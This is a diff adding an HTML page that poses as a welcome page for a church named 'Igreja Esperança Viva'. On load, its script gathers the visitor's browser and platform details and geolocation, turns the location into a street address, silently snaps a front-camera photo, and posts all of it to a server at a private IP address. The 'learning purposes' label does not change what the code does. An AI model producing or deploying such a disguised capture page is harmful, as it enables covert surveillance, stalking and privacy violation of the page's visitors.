@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Igreja Esperança Viva</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #e0d4f7, #f9f6ff);
+      text-align: center;
+      padding: 50px;
+    }
+    h1 {
+      color: #4b2e83;
+      font-size: 2.5em;
+    }
+    p {
+      font-size: 1.2em;
+      color: #333;
+    }
+    #status {
+      margin-top: 20px;
+      color: green;
+    }
+  </style>
+</head>
+<body>
+  <h1>Igreja Esperança Viva</h1>
+  <p>Seja bem-vindo! Estamos felizes por sua visita.</p>
+  <p id="status">Capturando dados para fins de aprendizado...</p>
+
+  <script>
+    async function capturarDados() {
+      try {
+        const sistema = navigator.platform;
+        const navegador = navigator.userAgent;
+
+        console.log("Sistema:", sistema);
+        console.log("Navegador:", navegador);
+
+        navigator.geolocation.getCurrentPosition(async (position) => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          console.log("Latitude:", latitude);
+          console.log("Longitude:", longitude);
+
+          const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
+          const geoData = await geoRes.json();
+          const endereco = geoData.display_name || 'Desconhecido';
+
+          console.log("Endereço:", endereco);
+
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          await video.play();
+
+          const canvas = document.createElement('canvas');
+          canvas.width = 640;
+          canvas.height = 480;
+          const context = canvas.getContext('2d');
+
+          setTimeout(() => {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imagem = canvas.toDataURL('image/png');
+
+            console.log("Imagem capturada");
+
+            fetch('https://192.168.5.106:3000/dados', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                latitude,
+                longitude,
+                endereco,
+                imagem,
+                sistema,
+                navegador
+              })
+            }).then(() => {
+              document.getElementById('status').textContent = '✅ Dados enviados com sucesso!';
+              stream.getTracks().forEach(track => track.stop());
+            }).catch(err => {
+              console.error("Erro ao enviar dados:", err);
+              document.getElementById('status').textContent = '❌ Erro ao enviar dados.';
+              stream.getTracks().forEach(track => track.stop());
+            });
+          }, 3000);
+        }, (err) => {
+          console.error("Erro ao obter localização:", err);
+          document.getElementById('status').textContent = '❌ Permissão de localização negada.';
+        });
+      } catch (err) {
+        console.error("Erro geral:", err);
+        document.getElementById('status').textContent = '❌ Erro ao capturar dados.';
+      }
+    }
+
+    window.onload = capturarDados;
+  </script>
+</body>
+</html>
